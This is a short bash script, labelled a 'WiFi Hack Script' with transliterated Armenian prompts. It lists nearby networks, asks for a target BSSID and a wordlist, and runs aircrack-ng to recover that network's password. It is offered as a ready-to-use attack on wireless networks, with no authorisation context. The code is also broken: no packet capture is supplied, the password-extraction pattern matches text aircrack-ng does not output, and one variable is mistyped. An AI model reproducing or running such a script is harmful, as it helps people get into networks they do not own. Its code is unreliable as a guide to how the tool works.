#!/bin/bash

# WiFi Hack Script

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Check if the script is run as root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}Ays scripty petq e baceq  root ov!${NC}" >&2
    echo -e "${RED}Nerbernel root grq: bash install.sh${MC}"
    exit 1
fi

# Scan for available WiFi networks
nmcli dev wifi list > wifi_list.txt

# Prompt the user to select the target network
echo -e "${GREEN}Wifiner motakayqum:${NC}"
cat wifi_list.txt
echo -e "${GREEN}greq wifi anuny (BSSID):${NC}"
read target_bssid

# Prompt the user to enter the path to a wordlist file
echo -e "${GREEN}greq chanaprhy vortex gtnvum e gaxtabaerey .txt formati mej:${NC}"
read wordlist_path

# Start the attack
echo -e "${GREEN}Sksum enq hardzakvel wifi vra.${NC}"
echo -e "${GREEN}Sa jamanak e pahanjum xndrum enq spasel${NC}"

# Use Aircrack-ng to crack the WiFi password
password=$(aircrack-ng -b $target_bssid -w $wordlist_path | grep -oP '(?<=PAROLY GTANQ! \[)(.*)(?=\])')

# Clean up
rm wifi_list.txt

# Check if the password was found
if [[ -n $password ]]; then
    echo -e "${GREEN}Hackingy avartvec paroly: $password${NC}"
else
    echo -e "${RED}Wifi hacky chexav paroly chi gtnve.${NC}"
fi